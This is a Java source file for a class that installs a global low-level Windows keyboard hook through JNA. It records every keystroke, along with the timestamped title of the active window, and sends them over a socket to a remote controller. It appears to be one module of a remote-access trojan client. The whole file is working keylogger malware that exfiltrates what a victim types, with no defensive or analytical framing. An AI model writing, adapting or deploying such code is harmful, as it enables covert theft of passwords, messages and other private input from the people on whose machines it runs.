package me.client.send;

import com.sun.jna.platform.win32.*;
import me.client.utils.LoadDLL;
import me.client.utils.MessageFlags;
import me.client.utils.SendMessage;

import javax.jws.soap.SOAPBinding;
import java.net.Socket;
import java.text.SimpleDateFormat;
import java.util.Date;

public class KeyBoardHook extends Thread{
    Socket socket;
    public volatile boolean run = false;
    public KeyBoardHook(Socket socket) {
        this.socket = socket;
    }
    private WinUser.HHOOK hhk;
    private static WinDef.HWND hwnd;
    private WinUser.LowLevelKeyboardProc keyboardProc = new WinUser.LowLevelKeyboardProc() {
        @Override
        public WinDef.LRESULT callback(int nCode, WinDef.WPARAM wParam, WinUser.KBDLLHOOKSTRUCT event) {
            if ((wParam.intValue() >= 0x2f) && (wParam.intValue() <= 0x100)) {
                if (!hwnd.equals(User32.INSTANCE.GetForegroundWindow())) {
                    SimpleDateFormat format = new SimpleDateFormat("hh:mm:ss");
                    char[] lpString = new char[260];
                    hwnd = User32.INSTANCE.GetForegroundWindow();
                    User32.INSTANCE.GetWindowText(hwnd,lpString,260);
                    String title = "\n" + "时间:" + format.format(new Date()) + " 标题:" +  String.valueOf(lpString) + "\n";
                    SendMessage.Send(MessageFlags.UPDATE_KEYBORAD,
                            title.getBytes(),socket);
                }
                    String str = String.valueOf(Win32VK.fromValue(event.vkCode)).replace("VK_", "");
                if (str.length() >= 2) {
                    if (event.vkCode == 0x0D) {
                        SendMessage.Send(MessageFlags.UPDATE_KEYBORAD, "\n".getBytes(), socket);
                    } else {
                        SendMessage.Send(MessageFlags.UPDATE_KEYBORAD, ("[" + str + "]").getBytes(), socket);
                    }
                } else {
                    if (LoadDLL.instance.KeyState() == 0) {
                        SendMessage.Send(MessageFlags.UPDATE_KEYBORAD, str.toLowerCase().getBytes(), socket);
                    } else {
                        SendMessage.Send(MessageFlags.UPDATE_KEYBORAD, str.getBytes(), socket);
                    }
                }
            }
            return com.sun.jna.platform.win32.User32.INSTANCE.CallNextHookEx(hhk, nCode, wParam, null);
        }
    };
    @Override
    public void run() {
        SimpleDateFormat format = new SimpleDateFormat("hh:mm:ss");
        char[] lpString = new char[260];
        hwnd = User32.INSTANCE.GetForegroundWindow();
        User32.INSTANCE.GetWindowText(hwnd,lpString,260);
        String title = "时间:" + format.format(new Date()) + " 标题:" +  String.valueOf(lpString) + "\n";
        SendMessage.Send(MessageFlags.UPDATE_KEYBORAD,
                title.getBytes(),socket);
        while (run) {
            setHookOn();
        }
    }
    public void setHookOn() {
        WinDef.HMODULE hMod = Kernel32.INSTANCE.GetModuleHandle(null);
        hhk = com.sun.jna.platform.win32.User32.INSTANCE.SetWindowsHookEx(com.sun.jna.platform.win32.User32.WH_KEYBOARD_LL, keyboardProc, hMod, 0);
        int result;
        WinUser.MSG msg = new WinUser.MSG();
        while ((result = com.sun.jna.platform.win32.User32.INSTANCE.GetMessage(msg, null, 0, 0)) != 0) {
            if (result == -1) {
                setHookOff();
                break;
            } else {
                com.sun.jna.platform.win32.User32.INSTANCE.TranslateMessage(msg);
                com.sun.jna.platform.win32.User32.INSTANCE.DispatchMessage(msg);
            }
        }
    }

    public void setHookOff() {
        User32.INSTANCE.UnhookWindowsHookEx(hhk);
    }
}
